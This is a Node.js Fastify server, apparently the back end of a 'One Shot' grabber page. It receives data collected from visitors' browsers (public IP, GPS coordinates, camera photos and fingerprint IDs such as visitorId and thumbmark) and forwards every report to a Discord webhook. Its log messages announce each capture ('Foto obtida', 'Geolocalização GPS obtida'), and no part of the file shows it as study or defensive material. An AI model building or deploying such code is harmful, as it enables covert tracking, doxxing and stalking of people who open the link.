import Fastify from 'fastify';
import fastifyStatic from '@fastify/static';
import { readFileSync } from 'fs';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import dotenv from 'dotenv';

dotenv.config({ path: '.env.local' });

const __dirname = dirname(fileURLToPath(import.meta.url));
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || '';

const fastify = Fastify({ logger: true });

await fastify.register(fastifyStatic, {
  root: join(__dirname, '..', 'public'),
  prefix: '/',
});

fastify.get('/', async (_request, reply) => {
  const html = readFileSync(join(__dirname, '..', 'public', 'index.html'), 'utf-8');
  return reply.type('text/html').send(html);
});

fastify.get('/mapa', async (_request, reply) => {
  const html = readFileSync(join(__dirname, '..', 'public', 'mapa.html'), 'utf-8');
  return reply.type('text/html').send(html);
});

function sendToDiscord(payload) {
  if (!DISCORD_WEBHOOK_URL) return Promise.resolve();
  return fetch(DISCORD_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
}

const bodySchema = { type: 'object', additionalProperties: true };

fastify.post('/api/report/ip', { schema: { body: bodySchema } }, async (request, reply) => {
  const payload = request.body || {};
  const ip = request.ip || request.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
  const userAgent = request.headers['user-agent'] || '';
  const data = {
    ipify: payload.ipify ?? null,
    ipinfo: payload.ipinfo ?? null,
    _server: { ip, userAgent, timestamp: new Date().toISOString() },
  };

  if (DISCORD_WEBHOOK_URL) {
    try {
      const ipifyIp = payload.ipify?.ip || '—';
      const ipinfoIp = payload.ipinfo?.ip || '—';
      const embed = {
        title: 'One Shot — Verificação de IP (ipify / ipinfo)',
        color: 0x57f287,
        fields: [
          { name: 'IP (servidor)', value: ip, inline: true },
          { name: 'ipify.org', value: ipifyIp, inline: true },
          { name: 'ipinfo.io', value: ipinfoIp, inline: true },
          { name: 'User-Agent', value: userAgent.slice(0, 1024), inline: false },
        ],
        description: '```json\n' + JSON.stringify(data, null, 2).slice(0, 3900) + '\n```',
        footer: { text: new Date().toISOString() },
      };
      await sendToDiscord({ content: 'Verificação de IP disponível', embeds: [embed] });
    } catch (err) {
      request.log.error({ err }, 'Discord webhook failed');
    }
  }
  return reply.send({ ok: true });
});

fastify.post('/api/report/geolocation', { schema: { body: bodySchema } }, async (request, reply) => {
  const payload = request.body || {};
  const ip = request.ip || request.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
  const userAgent = request.headers['user-agent'] || '';
  const geolocation = payload.geolocation || payload;
  const data = { geolocation, _server: { ip, userAgent, timestamp: new Date().toISOString() } };

  if (DISCORD_WEBHOOK_URL && geolocation) {
    try {
      const embed = {
        title: 'One Shot — Geolocalização GPS',
        color: 0xfee75c,
        fields: [
          { name: 'IP (servidor)', value: ip, inline: true },
          { name: 'Latitude', value: String(geolocation.lat ?? '—'), inline: true },
          { name: 'Longitude', value: String(geolocation.lon ?? '—'), inline: true },
          { name: 'Precisão (m)', value: String(geolocation.accuracy ?? '—'), inline: true },
          { name: 'Altitude', value: String(geolocation.altitude ?? '—'), inline: true },
          { name: 'User-Agent', value: userAgent.slice(0, 1024), inline: false },
        ],
        description: '```json\n' + JSON.stringify(data, null, 2).slice(0, 3900) + '\n```',
        footer: { text: new Date().toISOString() },
      };
      await sendToDiscord({ content: 'Geolocalização GPS obtida', embeds: [embed] });
    } catch (err) {
      request.log.error({ err }, 'Discord webhook failed');
    }
  }
  return reply.send({ ok: true });
});

fastify.post('/api/report/camera', { schema: { body: bodySchema } }, async (request, reply) => {
  const payload = request.body || {};
  const ip = request.ip || request.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
  const userAgent = request.headers['user-agent'] || '';
  let cameraBase64 = payload.camera || '';

  if (DISCORD_WEBHOOK_URL && cameraBase64) {
    try {
      const match = cameraBase64.match(/^data:image\/\w+;base64,(.+)$/);
      const base64Data = match ? match[1] : cameraBase64;
      const buffer = Buffer.from(base64Data, 'base64');
      const form = new FormData();
      form.append('file', new Blob([buffer], { type: 'image/jpeg' }), 'photo.jpg');
      form.append('payload_json', JSON.stringify({
        content: 'Foto obtida',
        embeds: [{
          title: 'One Shot — Foto',
          color: 0xeb459e,
          image: { url: 'attachment://photo.jpg' },
          fields: [
            { name: 'IP (servidor)', value: ip, inline: true },
            { name: 'User-Agent', value: userAgent.slice(0, 1024), inline: false },
          ],
          footer: { text: new Date().toISOString() },
        }],
      }));
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        body: form,
      });
    } catch (err) {
      request.log.error({ err }, 'Discord webhook camera failed');
    }
  }
  return reply.send({ ok: true });
});

fastify.post('/api/report', { schema: { body: bodySchema } }, async (request, reply) => {
  const payload = request.body || {};
  const ip = request.ip || request.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
  const userAgent = request.headers['user-agent'] || '';

  const report = {
    ...payload,
    _server: {
      ip,
      userAgent,
      timestamp: new Date().toISOString(),
    },
  };

  if (DISCORD_WEBHOOK_URL) {
    try {
      const forEmbed = { ...report };
      if (forEmbed.camera && forEmbed.camera.length > 200) {
        forEmbed.camera = '(base64 image, ' + Math.round(forEmbed.camera.length / 1024) + ' KB)';
      }
      const embed = {
        title: 'One Shot — Relatório completo',
        color: 0x5865f2,
        fields: [
          { name: 'IP', value: ip, inline: true },
          { name: 'User-Agent', value: userAgent.slice(0, 1024), inline: false },
          { name: 'Visitor ID', value: (report.fingerprint?.visitorId || report.visitorId || '—').slice(0, 1024), inline: true },
          { name: 'Thumbmark', value: (report.fingerprint?.thumbmark || report.thumbmark || '—').slice(0, 1024), inline: true },
          { name: 'Geolocalização', value: report.geolocation ? `${report.geolocation.latitude}, ${report.geolocation.longitude}` : '—', inline: true },
        ],
        description: '```json\n' + JSON.stringify(forEmbed, null, 2).slice(0, 3900) + '\n```',
        footer: { text: new Date().toISOString() },
      };
      await sendToDiscord({ content: 'Novo acesso One Shot (relatório completo)', embeds: [embed] });
    } catch (err) {
      request.log.error({ err }, 'Discord webhook failed');
    }
  }

  return reply.send({ ok: true });
});

const start = async () => {
  try {
    await fastify.listen({ port: Number(process.env.PORT) || 3000, host: '0.0.0.0' });
  } catch (err) {
    fastify.log.error(err);
    process.exit(1);
  }
};

start();
